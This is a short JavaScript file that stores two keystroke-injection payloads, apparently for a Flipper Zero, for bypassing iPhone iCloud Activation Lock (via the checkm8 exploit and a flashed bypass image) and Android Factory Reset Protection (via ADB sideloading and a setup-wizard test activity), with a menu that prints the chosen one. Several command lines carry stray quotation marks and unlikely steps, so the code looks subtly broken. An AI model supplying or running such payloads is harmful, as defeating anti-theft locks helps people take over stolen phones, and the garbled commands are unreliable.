const payloads = {
  icloud_bypass: [
    "# Step 1: Force DFU Mode",
    "DELAY 3000",
    "GUI r",
    "DELAY 500",
    "STRING powershell -command \"Start-Process cmd -ArgumentList '/c ideviceenterrecovery' -Verb RunAs\"",
    "ENTER",
    "",
    "# Step 2: Run checkm8 Exploit via Flipper Zero serial passthrough",
    "STRING python ipwndfu --exploit\"",
    "ENTER",
    "",
    "# Step 3: Flash custom RAM disk to bypass iCloud",
    "STRING irecovery -f bypass.img4\"",
    "ENTER",
    "",
    "# Step 4: Auto-setup device with default settings",
    "STRING ideviceactivation bypass\"",
    "ENTER"
  ].join("\n"),
  frp_bypass: [
    "# Step 1: Reboot to Fastboot/Bootloader",
    "DELAY 3000",
    "STRING adb reboot bootloader\"",
    "ENTER",
    "",
    "# Step 2: Flash TWRP or stock ROM with FRP disabled",
    "STRING fastboot flash recovery twrp.img && fastboot boot twrp.img\"",
    "ENTER",
    "",
    "# Step 3: Push FRP bypass APK via ADB sideload",
    "STRING adb sideload frp_bypass.apk\"",
    "ENTER",
    "",
    "# Step 4: Auto-execute bypass commands",
    "STRING adb shell am start -n com.android.setupwizard/.SetupWizardTestActivity\"",
    "ENTER"
  ].join("\n")
};

function selectPayload() {
  console.log("Select target:");
  console.log("[1] iPhone Activation Lock");
  console.log("[2] Android FRP Lock");
  const choice = prompt("> ");
  if (choice === "1") {
    console.log(payloads.icloud_bypass);
  } else if (choice === "2") {
    console.log(payloads.frp_bypass);
  } else {
    console.log("Invalid choice");
  }
}

if (typeof module !== "undefined" && module.exports) {
  module.exports = { payloads, selectPayload };
}
